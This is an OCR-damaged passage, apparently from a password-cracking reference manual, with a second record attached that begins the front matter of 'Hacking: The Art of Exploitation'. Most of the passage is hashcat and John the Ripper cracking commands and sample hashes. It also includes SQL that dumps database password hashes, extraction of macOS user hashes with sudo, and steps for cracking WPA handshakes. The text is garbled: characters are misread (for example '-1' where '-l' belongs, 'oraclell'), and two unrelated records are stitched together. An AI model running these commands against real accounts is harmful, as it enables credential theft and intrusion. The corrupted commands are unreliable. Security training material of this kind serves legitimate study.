-2\n88898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0ala2a3a4a5a6a7a8\nb0blb2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?1?2?1?2?1?2\nhashcat -a 3 -m #type hash.txt -1 charsets/German.hcchr -i ?1?1?1?1\nhashcat -a 3 -m #type hash.txt -1 charsets/French.hcchr -i ?1?1?1?1\nhashcat -a 3 -m #type hash.txt -1 charsets/Portuguese.hcchr -i ?1?1?1?1\nhashcat -a 3 -m #type hash.txt -1 charsets/<language>.hcchr -i ?1?1?1?1\nBulgarian, Castilian, Catalan, English, French, German, Greek, Greek\nPolytonic, Italian, Lithuanian, Polish, Portuguese, Russian, Slovak, Spanish\n--internal-encoding=NAME encoding used in rules/masks (see\nExample LM hashes from Western Europe, using a UTF-8 wordlist:\njohn --format=lm hast.txt --encoding=utf8 --target:cp850 --wo:spanish.txt\nExample using UTF-8 wordlist with internal encoding for rules\njohn --format=#type hash.txt --encoding=utf8 --internal=CP1252 --\nExample mask mode printing all possible \u201cLatin-1\u201d words of length 4:\njohn --stdout --encoding=utf8 --internal=8859-1 --mask:?1?1?1?1\nUTF-8, ISO-8859-1 (Latin), ISO-8859-2 (Central/Eastern Europe), ISO-\n8859-7 (Latin/Greek), ISO-8859-15 (Western Europe), CP437 (Latin),\nCP737 (Greek), CP850 (Western Europe), CP852 (Central Europe), CP858\n(Western Europe), CP866 (Cyrillic), CP1250 (Central Europe), CP1251\n(Russian), CP1252 (Default Latin1), CP1253 (Greek) and K0I8-R (Cyrillic).\nIf your unsure as to position of a foreign character set contained within your\ntarget password, you can attempt the ?b byte charset in a mask using a sliding\nwindow. For example if we have a password 6 characters long:\nhashcat -a 0 -m #type hash.txt dict.txt --encoding-from=utf-8\nhashcat -a o -m #type hash.txt dict.txt --encoding-to=iso-8859-15\niconv -f <old_encode> -t <new_encode> < dict.txt | sponge dict.txt.enc\nExample of converting $HEX[] entries in hashcat.pot f i l e to ASCII\ngrep \u2018$HEX\u2019 hashcat.pot | awk -F \u201c:\u201d {\u2018print$2\u2019} |perl -ne \u2018 i f ($_ =~\nm/\\$HEX\\[([A-Fa-f0-9]+)\\]/) {print pack(\u201cH*\u201d, $1), \u201c\\n\u201d}\u2019\nPRINCE (PRobability INfinite Chained Elements) Attack takes one input\nwordlist and builds \u201cchains\u201d of combined words automatically.\npp64.bin --case-permute dict.txt | hashcat -a 0 -m #type hash.txt -r rule.txt\nExample PRINCE attack producing minimum 8 char candidates with 4\nelements piped directly into Hashcat with rules attack.\npp64.bin --pw-min=8 --limit=4 dict.txt|hashcat -a 0 -m # hash.txt -r\nPiping the output of one PRINCE attack into another PRINCE attack.\npp64.bin dict.txt | pp64.bin | hashcat -a 0 -m #type hash.txt\nMask attack generator with a custom configurable charset and ability to limit\nconsecutive and repeating characters to decrease attack keyspace.\nLimit 4 consecutive identical characters in the password string \u201c-q\u201d\nmp64.bin -q 4 ?d?d?d?d?d?d?d?d | hashcat -a 0 -m #type hash.txt\nLimit 4 identical characters in the password string \u201c-r\u201d option:\nmp64.bin -r 4 ?d?d?d?d?d?d?d?d | hashcat -a 0 -m #type hash.txt\nLimit 2 consecutive and 2 identical characters in the password string:\nmp64.bin -r 2 -q 2 ?d?d?d?d?d?d?d?d | hashcat -a 0 -m #type hash.txt\nCustom charset limiting 2 consecutive and 2 identical characters in the\nmp64.bin -r 2 -q 2 -1 aeiuo -2 TGBYHN ?l?2?l?2?d?d?d?d | hashcat -a 0 -m\nWord-generator based on the per-position markov-attack.\nCreate custom Markov models using hashcat-util hcstatgen.bin based on\ncracked target passwords. The util hcstatgen makes a 32MB file each time no\nmatter how small/large the password list provided. Highly recommended you\nmake custom Markov models for different target sets.\nIs a high-performance word-generator based on a user supplied per-position\nMarkov model (hcstat file) using mask attack notation.\nStep 2.1: Supply your new Markov model to Hashcat as mask or rule\nhashcat -a 3 -m #type hash.txt --markov-hcstat=out.hcstat ?a?a?a?a?a?a\nhashcat -a 0 -m #type hash.txt dict.txt -r rule.txt --markov-hcstat=out.hcstat\nStep 2.2: OR Supply your new Markov model with sp64 and pipe into\nsp64.bin --pw-min 3 --pw-max 5 out.hcstat ?1?1?1?1?1?1 | hashcat -a 0 -m\nKeyboard-walk generator with configurable base chars, keymappings and\nExample keyboard walk with tiny charset in english mapping and with 2-10\nadjacent keys piping out results into a hashcat attack:\nkwp.bin basechar/tiny.base keymaps/en.keymap routes/2-to-10-max-3 -0\nExample keyboard walk with full charset in english mapping and with 3x3\nadjacent keys piping out results into a hashcat attack:\n./kwp basechars/full.base keymaps/en.keymap routes/3-to-3-\nMDXFIND is a program which allows you to run large numbers of unsolved\nhashes of any type, using many algorithms concurrently, against a large\nnumber of plaintext words and rules, very quickly. It\u2019s main purpose was to\ndeal with large lists (20 million, 50 million, etc) of unsolved hashes and run\nSo when would you use MDXFIND on a pentest? If you dump a database\ntied to website authentication and the hashes are not cracking by standard\nattack plans. The hashes may be generated in a unique nested hashing series.\nIf you are able to view the source code of said website to view the custom\nhashing function you can direct MDXFIND to replicate that hashing series. If\nnot, you can still run MDXFIND using some of the below \u2018Generic Attack\nCommands\u2019. MDXFIND is tailored toward intermediate to expert level\npassword cracking but is extremely powerful and flexible.\nExample website SHA1 custom hashing function performing multiple\nCOMMAND STRUCTURE THREE METHODS 1-STDOUT 2-STDIN 3-\n1- Reads hashes coming from cat (or other) commands stdout.\ncat hash.txt | mdxfind -h <regex #type> -i <#iterations> dict.txt > out.txt\n2- Takes stdin from outside attack sources in place of dict.txt when using the\noptions variable \u2018-f\u2019 to specify hash.txt file location and variable \u2018stdin\u2019.\nmp64.bin ?d?d?d?d?d?d | mdxfind -h <regex #type> -i <#iterations> -f\n3- Specify file location \u2018-f\u2019 with no external stdout/stdin sources.\nmdxfind -h <regex #type> -i <#iterations> -f hash.txt dict.txt > out.txt\nReplace each special char (<>&, etc) with XML equivalents\nDe-duplicate wordlists, best effort...but best to do ahead of time\nInternal iteration counts for SHA1MD5X, and others. For example, if\nyou have a hash that is SHA1(MD5(MD5(MD5(MD5($pass)))))),\nRotate calculated hashes to attempt match to input hash\nNumber of digits to append to passwords. Other options, like: -n 6x\nwould append 6 digit hex values, and 8i would append all ipv4\nThis is a good general purpose MDXFIND command to run your hashes\nagainst if you suspect them to be \u201cnon-standard\u201d nested hashing sequences.\nThis command says \u201cRun all hashes against dict.txt using 10 iterations except\nones having a salt, user, or md5x value in the name.\u201d It\u2019s smart to skip\nsalted/user hash types in MDXFIND unless you are confident a salt value has\ncat hash.txt | mdxfind -h ALL -h \u2018!salt,!user,!md5x\u2019 -i 10 dict.txt >\nThe developer of MDXFIND also recommends running the below command\ncat hash.txt | mdxfind -h <^md5$,^sha1$,^md5md5pass$,^md5sha1$\u2019 -i\ncat hash.txt | mdxfind -h <^md5$,^sha1$,^md5md5pass$,^md5sha1$\u2019 -i\n-Can do multiple hash types/files all during a single attack run.\ncat sha1/*.txt sha256/*.txt md5/*.txt salted/*.txt | mdxfind\n-Supports VERY large hashlists (l00mil) and 10kb character passwords\n-Supports using hashcat rule files to integrate with dictionary\n-Option \u2018-z\u2019 outputs ALL viable hashing solutions and file can grow very\n-Supports including/excluding hash types by using simple regex parameters\n-Supports multiple iterations (up to 4 billion times) by tweaking -i parameter\nmd5(md5(md5(md5(md5(md5(md5(md5(md5(md5($pass))))))))))\n-Separate out -usernames -email -ids -salts to create custom attacks\n-If you are doing brute-force attacks, then hashcat is probably better route\n-When MDXfind finds any solution, it outputs the kind of solution found,\nfollowed by the hash, followed by the salt and/or password. For example:\nWhen cracking large lists of hashes from multiple file locations, MDSPLIT\nwill help match which files the cracked hashes were found in, while also\noutputing them into separate files based on hash type. Additionally it will\nremove the found hashes from the original hash file.\nCOMMAND STRUCTURE TWO METHODS 1-STDOUT 2-STDIN 3-File\n1- Matching MDXFIND results files with their original hash_orig.txt files.\ncat hashes_out/out_results.txt | mdsplit hashes_orig/hash_orig.txt\nOR perform matching against a directory of original hashes and their results.\n2- Piping MDXFIND directly into MDSPLIT to sort in real-time results.\ncat *.txt | mdxfind -h ALL -h \u2018!salt,!user,!md5x\u2019 -i 10 dict.txt | mdsplit\n3- Specifying a file location in MDXFIND to match results in real-time.\nmdxfind -h ALL -f hashes.txt -i 10 dict.txt | mdsplit hashes.txt\n-MDSPLIT will append the final hash solution to the end of the new\nfilename. For example, if we submitted a \u2018hashes.txt\u2019 and the solution to the\nhashes was \u201cMD5x01\u201d then the results file would be \u2018hashes.MD5x01\u2019. If\nmultiple hash solutions are found then MDSPLIT knows how to deal with\nthis, and will then remove each of the solutions from hashes.txt, and place\nthem into \u2018hashes.MD5x01\u2019, \u2018hashes.MD5x02\u2019, \u2018hashes.SHA1\u2019... and so on.\n-MDSPLIT can handle sorting multiple hash files, types, and their results all\nat one time. Any solutions will be automatically removed from all of the\nsource files by MDSPLIT, and tabulated into the correct solved files. For\ncat dirl/*.txt dir2/*.txt dir3/*.txt | mdxfind -h \u2018^md5$,^sha1$,^sha256$\u2019 -i 10\ndict.txt | mdsplit dirl/*.txt dir2/*.txt dir3/*.txt\nStep 1: Calculate keyspace for attack (Example MD5 Brute Force x\nStep 2: Distribute work through keyspace division (s)kip and (l)imit\nNode1#    hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a -s 0 -1 27150208\nNode2#    hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a -s 27150208 -1 27150208\nNode3#    hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a -s 54300416 -1 27150209\nManual distribution using Options --node & --fork to 3 similar CPU\nNode# john --format=<#> hash.txt --wordlist=dict.txt --rules=All --fork=8 --\nNode2# john --format=<#> hash.txt --wordlist=dict.txt --rules=All --fork=8 --\nNode3# john --format=<#> hash.txt --wordlist=dict.txt --rules=All --fork=8 --\nOption 1:Enable OpenMP through uncommenting in Makefile\nOption 2:Create additional incremental modes in john.conf\nhttps://github.com/RUB-SysSec/Password-Guessing-Framework\nPassword Guessing Framework is an open source tool to provide an\nautomated and reliable way to compare password guessers. It can help to\nidentify individual strengths and weaknesses of a guesser, it\u2019s modes of\noperation, or even the underlying guessing strategies. Therefore, it gathers\ninformation about how many passwords from an input f i l e (password leak)\nhave been cracked in relation to the amount of generated guesses. Subsequent\nto the guessing process an analysis of the cracked passwords is performed.\nRandom creative password attacks using the power of stdin and stdout. Not\nimplying they\u2019re useful but to demonstrate the power of mixing and\npp64.bin dict.txt | mdxfind -h ALL -f hash.txt -i 10 stdin > out.txt\ncombinator.bin dict.txt dict.txt | pp64.bin | hashcat -a 0 -m #type hash.txt -r\ncombinator3.bin dict.txt dict.txt dict.txt | pp64.bin | hashcat -a 0 -m #type\nhashcat -a 0 dict.txt -r dive.rule --stdout | pp64.bin | hashcat -a 0 -m #type\nhashcat -a 6 dict.txt ?a?a?a?a --stdout | pp64.bin --pw-min=8 | hashcat -a 0 -m\nhashcat -a 7 ?a?a?a?a dict.txt --stdout | pp64.bin --pw-min=8 | hashcat -a 0 -m\nhashcat -a 6 dict.txt rockyou-1-60.hcmask --stdout | pp64.bin --pw-min=8 --\nhashcat -a 7 rockyou-1-60.hcmask dict.txt --stdout | pp64.bin --pw-min=8 --\nInformation in this chapter is an attempt to summarize a few of the basic and\nmore complex concepts in password cracking. This allows all skill levels to\ngrasp these concepts without needing a Linguistics or Mathematics Degree.\nIt\u2019s an almost impossible task to condense into one paragraph, but the\nfollowing is an attempt. For a deeper understanding, I highly encourage you\nto read the Resource links included below each section.\nPassword entropy is a measure of how random/unpredictable a password\ncould have been, so it does not really relate to the password itself, but to a\nselection process. When judging human generated passwords for entropy, it\nfrankly isn\u2019t an accurate measurement. Thisis true mainly because humans\nlike to use memorable words/sequences and thus a myriad of attacks account\nfor that behavior. however, entropy is good for measuring randomly\ngenerated passwords from password managers, such as 1Password or\nKeepass, in that each default character set used can be calculated. Password\nentropy is measured in bits and uses the following formula where C=Size of\nCharacter set & L=Length of password: log(C) / log(2) * L\nTo calculate the time to crack, just use the benchmarking function on your\nfavorite cracking software against your mode of hash to obtain cracks per\nsecond. The table below estimates password length using an MD4 hashing\n*Table only truly matters for randomly generated passwords\nhttps://blogs.technet.microsoft.com/msftcam/2015/05/19/password-\nA cryptographic hash function is a subclass of the general hash function\nwhich possesses properties lending its use in cryptography. Cryptographic\nhash functions are mathematical algorithms which map data of any size to a\nstring containing a fixed length, and should make it infeasible to reverse. For\ninstance, the string \u201cpassword,\u201d when mapped using the MD5 hash function,\n\u201c5f4dcc3b5aa765d61d8327deb882cf99\u201d. The 32 character string cannot\ntheoretically be reversed with any other mapped input data except\n\u201cpassword\u201d. The current method of recreating this input data \u201cpassword\u201d is\nthrough a dictionary/mask/brute-force attack of all possible inputs matching\nthe hashed value; also called a pre-image attack. Generally speaking, hash\nfunctions should possess the below characteristics:\n-Be computationally infeasible to find two different sets of input data with the\n-The hash value should be \u201cquick\u201d to compute (i.e. > ~1 second).\n-It should be difficult to generate the input data Just by looking at the hash\n-One simple change to the input data should drastically change the resultant\nhttp://www.metamorphosite.com/one-way-hash-encryption-sha1-data-\nMarkov Chains are created, for our password cracking purposes, by statistical\nanalysis of a large list of passwords/words (i.e. the RockYou password\ndataset). The resultant analysis of these words and their per-position character\nfrequency/probability are stored in a table. This table is referenced when\nperforming brute-force/mask attacks to prevent having to generate password\ncandidates in a sequential order, which is very inefficient. Instead, the most\ncommon characters are attempted first in order of preceding character\nprobability. So let\u2019s see sequential brute-force ?a?a?a?a with out Markov\nNow the same brute-force attack with Markov Chains applied:\nMarkov Chains predict the probability of the next character in a password\nbased on the previous characters, or context characters. It\u2019s that simple.\nFast Dictionary Attacks on Passwords Using Time-Space Tradeoff\nOMEN: Faster Password Guessing Using an Ordered Markov\nA Probabilistic Context Free Grammar (PCFG) consists of terminal and\nnonterminal variables. Each feature to be modeled has a production rule that\nis assigned a probability, estimated from a training set of RNA structures.\nProduction rules are recursively applied until only terminal residues are left.\nThe notion supporting PCFGs is that passwords are constructed with template\nstructures and terminals that fit into those structures. For example, the\npassword candidate \u2018passwordl23!\u2019 is 8 letters, 3 digits, 1 special and would\nbe noted as \u2018L8D3S1\u2019. A password\u2019s probability of occurring is the\nprobability of its structure, multiplied by those of its underlying terminals.\nPassword Cracking Using Probabilistic Context-Free Grammars\nhttps://sites.google.com/site/reusablesec/Home/password-cracking-\nArtificial Neural Networks or Neural Networks (NN) is a machine-learning\ntechnique composed of nodes called Artificial Neurons, just like the brain\npossesses. Such systems use Machine Learning to approximate highly\ndimensional functions and progressively learn through examples of training\nset data, or in our case a large password dump. They have shown initial\npromise to be effective at generating original yet representative password\ncandidates. Advantages to NN\u2019s for password cracking are the low overhead\nfor storing the final NN model, approximately 500kb, and the ability to\ncontinually learn over time through retraining or transfer learning.\nFast, Lean, and Accurate: Modeling Password Guessability Using Neural\nhttps://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper\nMD5, NTLM, NTLMv2, LM, MD5crypt, SHA1, SHA256, bcrypt, PDF\n1.4 - 1.6 (Acrobat 5-8), Microsoft OFFICE 2013, RAR3-HP, Winzip,\n7zip, Bitcoin/Litecoin, MAC OSX v10.5-v10.6, MySQL 4.1-5+, Postgres,\nMSSQL(2012)-MSSQL(2014), Oracle 11g, Cisco TYPE 4 5 8 9, WPA\njohn --format=raw-md5 wordlist=dict.txt --rules hash.txt\njohn --format=nt wordlist=dict.txt --rules hash.txt\nusername::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966al53a0064958\nC7830310000000000000b45c67103d07d7b95acdl2ffall230e0000000052920b\nusername:$NETNTLMv2$NTLMV2TESTWORKGROUP$11223344556677\n5C87EC1D5$0101000000000000006CF6385B74CA01B3610B02D99732DD\n0052004B00470052004F00550050000100200044004100540041002E004200\njohn --format=netntlmv2 wordlist=dict.txt --rules hash.txt\njohn --format=lm wordlist=dict.txt --rules hash.txt\njohn --format=md5crypt wordlist=dict.txt --rules hash.txt\njohn --format=raw-sha1 wordlist=dict.txt --rules hash.txt\n127e6fbfe24a750e72930c220a8el38275656b8e5d8f48a98c3c92df2caba935\n127e6fbfe24a750e72930c220a8el38275656b8e5d8f48a98c3c92df2caba935\njohn --format=raw-sha256 wordlist=dict.txt hash.txt\njohn --format=raw-sha256 wordlist=dict.txt --rules hash.txt\n$2a$05$LhayLxezLhKlLhWvKxCyLOj0jlu.Kj0jZ0pEmml34uzrQlFvQDLF6\n$2a$05$LhayLxezLhKlLhWvKxCyLOj0jlu.Kj0jZ0pEmml34uzrQlFvQDLF6\njohn --format=bcrypt wordlist=dict.txt --rules hash.txt\n$pdf$2*3*128*-1028*l*16*da42eel5d4b3e08fe5b9ecea0e02ad0f*32*c9b59d\n4fcald2cal5000000000000000000000000000000000*32*c4ff3e868dc876046\nhashcat -m 10500 -a 0 hash.txt dict.txt -r rule.txt\n$pdf$Standard*badadle86442699427116d3e5d5271bc80a27814fc5e80f815efe\n89ece9b5ce451a5d7064693dab3badfl01112131415161718191alblcldlelf*16*\njohn --format=pdf wordlist=dict.txt --rules hash.txt\nexample.docx:$office$*2013*100000*256*16*7dd611d7eb4c899f74816dldec\nb2c2c6c32fl4b5995a543ad037*0b7ee0e48e935f937192a59de48a7d561ef2691\nhashcat -m 9600 -a 3 --username hash.txt ?a?a?a?a?a?a\nhashcat -m 9600 -a 0 --username hash.txt dict.txt -r rule.txt\nexample.docx:$office$*2013*100000*256*16*7dd611d7eb4c899f74816dldec\njohn --format=office2013 wordlist=dict.txt hash.txt\njohn --format=office2013 wordlist=dict.txt --rules hash.txt\n$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317\n#!Ensure to remove extraneous rar2john output to match above hash!#\nhashcat -m 12500 -a 0 hash.txt dict.txt -r rule.txt\nexample.rar:$RAR3$*l*20e041a232b4b7f0*5618c5f0*1472*2907*0*/Path/T\njohn --format=rar wordlist=dict.txt --rules hash.txt\n$zip2$*0*3*0*b5d2b7bf57ad5e86a55c400509c672bd*d218*0**ca3d736d03a\n#!Ensure to remove extraneous zip2john output to match above hash!#\nhashcat -m 13600 -a 0 hash.txt dict.txt -r rule.txt\nexample.zip:$zip2$*0*3*0*5b0a8bl53fb94bf719abb81a80e90422*8e91*9*0b\n938ce9c*3f37001e241el96195al*$/zip2$:: : ::example.zip\njohn --format=ZIP wordlist=dict.txt --rules hash.txt\n$7z$0$19$0$salt$8$f6196259a7326e3f0000000000000000$185065650$112$\n419a25acd40c0c2d75421cf23263f69c51bl3f9blaada41a8a09f9adeae45d67c60\n0dcc5eb811c7a61128ee0746f922cdb9c59096869f341c7a9cblac7bb7d771f546\nCd4b61751e4d8de66dd6e2dfb5b7dl022d2211e2d66eal703f96\n#!Ensure to remove extraneous 7zip2john output to match above hash!#\nhashcat -m 11600 -a 0 hash.txt dict.txt -r rule.txt\nexample.7z:$7z$0$19$0$salt$8$f6196259a7326e3f0000000000000000$1850\n3bc2a88062c419a25acd40c0c2d75421cf23263f69c51bl3f9blaada41a8a09f9ad\n6aad338f20c0dcc5eb811c7a61128ee0746f922cdb9c59096869f341c7a9cblac7\nCf4e6flla5ecd4b61751e4d8de66dd6e2dfb5b7dl022d2211e2d66eal703f96\njohn --format=7z wordlist=dict.txt --rules hash.txt\n$bitcoin$96$d011alb6a8d675b7a36d0cd2efaca32a9f8dcld57d6d01a58399ea0\n99039326f7a00fl71a7bbc854a54$16$1563277210780230$158555$96$62883\n570448571536352510740823233055715845322741625407685873076027233\n258828754805137518513334416237028528114407758881220463605617605\nhashcat -m 11300 -a 0 hash.txt dict.txt -r rule.txt\n$bitcoin$96$d011alb6a8d675b7a36d0cd2efaca32a9f8dcld57d6d01a58399ea0\n99039326f7a00fl71a7bbc854a54$16$1563277210780230$158555$96$62883\n570448571536352510740823233055715845322741625407685873076027233\n258828754805137518513334416237028528114407758881220463605617605\njohn --format=bitcoin wordlist=dict.txt --rules hash.txt\nusername:$ml$35714$50973de90d336b5258f01e48ab324aa9ac81ca7959ac47\n398$631a0ef84081b37cfe594a5468cf3a63173cd2ec25047b89457ed300f2b41\nC5f3f7be8f74b7269ee3713172642de96ee482432a8dl2bf291a\nsudo plist2hashcat.py /var/db/dslocal/nodes/Default/users/<username>.plist\nsha512$31724.019739e90d326b5258f01e483bl24aa9ac81ca7959acb\n70c3d9c4297af924398.631a0bf84081b37dae594a5468cf3a63183cd2ec25047b\n1b40a0793a39512fc5a3f7ae8f74b7269ee3723172642de96eee82432a8dllbf36\nNAME:/bin/bash:/var/db/dslocal/nodes/Default/users/username.plist\nsudo ml2john.py /var/db/dslocal/nodes/Default/users/<username>.plist\njohn --format=xsha wordlist=dict.txt --rules hash.txt\nSELECT user,password FROM mysql.user INTO OUTFILE \u2018/tmp/hash.txt\u2019;\nSELECT user,password FROM mysql.user INTO OUTFILE \u2018/tmp/hash.txt\u2019;\njohn --format=mysql-sha1 wordlist=dict.txt hash.txt\njohn --format=postgres wordlist=dict.txt --rules hash.txt\n0x02000102030434ealbl7802fd95ea6316bd61d2c94622ca3812793e8fbl67248\n2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\nSELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;\n0x02000102030434ealbl7802fd95ea6316bd61d2c94622ca3812793e8fbl67248\n2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\nSELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;\njohn --format=mssql12 wordlist=dict.txt --rules hash.txt\nac5fle62d21fd0529428b84d42e8955b04966703:38445748184477378130\nSELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;\nac5fle62d21fd0529428b84d42e8955b04966703:38445748184477378130\nSELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;\njohn --format=oraclell wordlist=dict.txt --rules hash.txt\njohn --format=md5crypt wordlist=dict.txt --rules hash.txt\n$8$TnGX/fE4KGH0VU$pEhnEvxrvaynpi8j4f.EMHr6M.FzU8xnZnBr/tJdFW\n$8$TnGX/fE4KGH0VU$pEhnEvxrvaynpi8j4f.EMHr6M.FzU8xnZnBr/tJdFW\njohn --format=pbkdf2-hmac-sha256 wordlist=dict.txt hash.txt\njohn --format=pbkdf2-hmac-sha256 wordlist=dict.txt --rules hash.txt\n$9$2MJBozw/9R3UsU$21FhcKvpghcyw8deP25G0fyZaagyU0GBymkryv0df\n$9$2MJBozw/9R3UsU$21FhcKvpghcyw8deP25G0fyZaagyU0GBymkryv0df\njohn --format=scrypt wordlist=dict.txt --rules hash.txt\n*Capture 4-way authentication handshake > capture.cap\nhashcat -m 2500 -a 3 capture_out.hccapx ?a?a?a?a?a?a\nhashcat -a 0 capture_out.hccapx dict.txt -r rule.txt\n*Capture 4-way authentication handshake > capture.cap\ncap2hccap.bin -e \u2018<ESSID>\u2019 capture.cap capture_out.hccap\nBRUTE-FORCE ATTACK - the act of trying every possible\ncombination of a given keyspace or character set for a given length\nDICTIONARY - a collection of commons words, phrases, keyboard\npatterns, generated passwords, or leaked passwords, also known as a\nDICTIONARY ATTACK - using a file containing common or known\npassword combinations or words in an attempt to match a given hashing\nfunction\u2019s output by running said words through the same target\nHASH FUNCTION - maps data of arbitrary size to a bit string of a fixed\nsize (a hash function) which is designed to also be a one-way function,\nITERATIONS - the number of times an algorithm is run over a given\nKEYSPACE - the number of possible combinations for a given character\nset to the power of it\u2019s length (i.e. charset^length)\nMASK ATTACK - using placeholder representations to try all\ncombinations of a given keyspace, similar to brute-force but more\nPASSWORD ENTROPY - an estimation of how difficult a password will\nPLAINTEXT - unaltered text that hasn\u2019t been obscured or\nRAKING - generating random password rules/candidates in an attempt\nto discover a previously unknown matching password pattern\nRAINBOW TABLE - a precomputed table of a targeted cryptographic\nhash function of a certain minimum and maximum character length\nRULE ATTACK - similar to a programming language for generating\ncandidate passwords based on some input such as a dictionary\nSALT - random data that used as additional input to a one-way function\nWORDLIST - a collection of commons words, phrases, keyboard\npatterns, generated passwords, or leaked passwords, also known as a\nhttp://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats\nhttps://countuponsecurity.com/2015/06/14/jonh-the-ripper-cheat-sheet/\nhttps://xinn.org/blog/JtR-AD-Password-Auditing.html\nhttps://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-\nhttps://hashcat.net/wiki/doku.php?id=statsprocessor\nhttp://www.netmux.com/blog/ultimate-guide-to-cracking-foreign-character-\nhttp://www.netmux.com/blog/cracking-12-character-above-passwords\nhttp://www.netmux.com/blog/how-to-build-a-password-cracking-rig\nninja.com/p/Building_a_Password_Cracking_Rig_for_Hashcat_-_Part_III\nhttp://openwall.info/wiki/john/Generating-test-hashes\nhttp://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-\nhttps://blog.gotmilk.com/2011/06/dictionaries-wordlists/\nhttps://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers\nhttps://room362.com/post/2017/05-06-2017-password-magic-numbers/\nhttp://www.netmux.com/blog/how-to-build-a-password-cracking-rig\ne4821dl6a298092638ddb7cadc26d32f = letmein123456Netmux\n1. Thou shalt know hash types and their origin/function\n2. Thou shalt know cracking software strengths & weaknesses\n3. Thou shalt study & apply password analysis techniques\n4 Thou shalt be proficient at hash extraction methods\n7. Thou shalt understand basic human psychology/behavior\n8. Thou shalt create custom masks, rules, and Markov chains\n9. Thou shalt continually experiment with new techniques\n10. Thou shalt support thy fellow cracking community members\nJohn the Ripper password cracker, version 1.8.0-jumbo-1 [darwinl5.6.0 64-\n7z 7z-opencl AFS agilekeychain agilekeychain-opencl aix-smd5 aix-ssha1\naix-ssha256 aix-ssha512 asa-md5 bcrypt bcrypt-opencl bfegg Bitcoin\nblackberry-es10 Blockchain blockchain-opencl bsdicrypt chap Citrix_NS10\nClipperz cloudkeychain cq CRC32 crypt dahua descrypt descrypt-opencl\nDjango django-scrypt dmd5 dmg dmg-opencl dominosec dragonfly3-32\ndragonfly3-64 dragonfly4-32 dragonfly4-64 Drupal7 dummy dynamic_n\neCryptfs EFS eigrp EncFS encfs-opencl EPI EPiServer fde FormSpring\nFortigate gost gpg gpg-opencl HAVAL-128-4 HAVAL-256-3 hdaa HMAC-\nHMAC-SHA512 hMailServer hsrp IKE ipb2 KeePass keychain keychain-\nopencl keyring keyring-opencl keystore known_hosts krb4 krb5 krb5-18\nkrb5pa-md5 krb5pa-md5-opencl krb5pa-sha1 krb5pa-sha1-opencl kwallet\nLastPass LM lotus5 lotus5-opencl lotus85 LUKS MD2 md4-gen md5crypt\nmd5crypt-opencl md5ns mdc2 MediaWiki MongoDB Mozilla mscash\nmscash2 mscash2-opencl MSCHAPv2 mschapv2-naive mssql mssql05\nmssqll2 mysql mysql-sha1 mysql-sha1-opencl mysqlna net-md5 net-sha1\nnethalflm netlm netlmv2 netntlm netntlm-naive netntlmv2 nk nsldap NT nt-\nopencl nt2 ntlmv2-opencl o51ogon o51ogon-opencl ODF ODF-AES-opencl\nODF-opencl Office office2007-opencl office2010-opencl office2013-opencl\noldoffice oldoffice-opencl OpenBSD-SoftRAID openssl-enc OpenVMS\noracle oraclell osc Panama PBKDF2-HMAC-SHA1 PBKDF2-HMAC-\nSHA1-opencl PBKDF2-HMAC-SHA256 PBKDF2-HMAC-SHA256-opencl\nPBKDF2-HMAC-SHA512 pbkdf2-hmac-sha512-opencl PDF PFX phpass\nphpass-opencl PHPS pix-md5 PKZIP po postgres PST PuTTY pwsafe\npwsafe-opencl RACF RAdmin RAKP RAKP-opencl rar rar-opencl RAR5\nRAR5-opencl Raw-Blake2 Raw-Keccak Raw-Keccak-256 Raw-MD4 Raw-\nMD4-opencl Raw-MD5 Raw-MD5-opencl Raw-MD5u Raw-SHA Raw-\nSHA1 Raw-SHA1-Linkedin Raw-SHA1-ng Raw-SHA1-opencl Raw-\nSHA224 Raw-SHA256 Raw-SHA256-ng Raw-SHA256-opencl Raw-\nSHA384 Raw-SHA512 Raw-SHA512-ng Raw-SHA512-opencl ripemd-128\nripemd-160 rsvp Salted-SHA1 sapb sapg scrypt sha1-gen sha1crypt\nsha1crypt-opencl sha256crypt sha256crypt-opencl sha512crypt sha512crypt-\nopencl Siemens-S7 SIP skein-256 skein-512 skey Snefru-128 Snefru-256\nSSH SSH-ng ssha-opencl SSHA512 STRIP strip-opencl SunMD5 sxc sxc-\nopencl Sybase-PROP sybasease tc_aes_xts tc_ripemdl60 tc_sha512\ntc_whirlpool tcp-md5 Tiger tripcode VNC vtp wbb3 whirlpool whirlpool0\nwhirlpooll WoWSRP wpapsk wpapsk-opencl xsha xsha512 XSHA512-\n***HASH CRACKING BENCHMARK tables are meant to be a reference to\nenable users to gauge how SLOW or FAST a hashing algorithm is before\nformulating an attack plan. Nvidia GTX2080 was chosen as the default due\nto its prevalence among the cracking community and it\u2019s position as a top\n*CRACKING SPEED BASED ON NVIDIA GTX 1080 & HASHCAT v3.6\n*Speed based on NVIDIA GTX 1080 Running Hashcat v3.6"}
{"source": "book", "book": "Books", "file": "Jon Erickson - Hacking Art of Exploitation.pdf", "text": "\u201cMost complete tutorial on hacking techniques. Finally a book that does not\njust show how to use the exploits but how to develop them.\u201d\n\u201cFrom all the books I\u2019ve read so far, I would consider this the seminal\n\u201cI recommend this book for the programming section alone.\u201d\n\u201cI highly recommend this book. It is written by someone who knows of what\n\u201cErickson\u2019s book, a compact and no-nonsense guide for novice hackers,\nis filled with real code and hacking techniques and explanations of how\n\u201cThis is an excellent book. Those who are ready to move on to [the next\nlevel] should pick this book up and read it thoroughly.\u201d\nHACKING: THE ART OF EXPLOITATION, 2ND EDITION. Copyright \u00a9 2008 by Jon Erickson.\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or\nmechanical, including photocopying, recording, 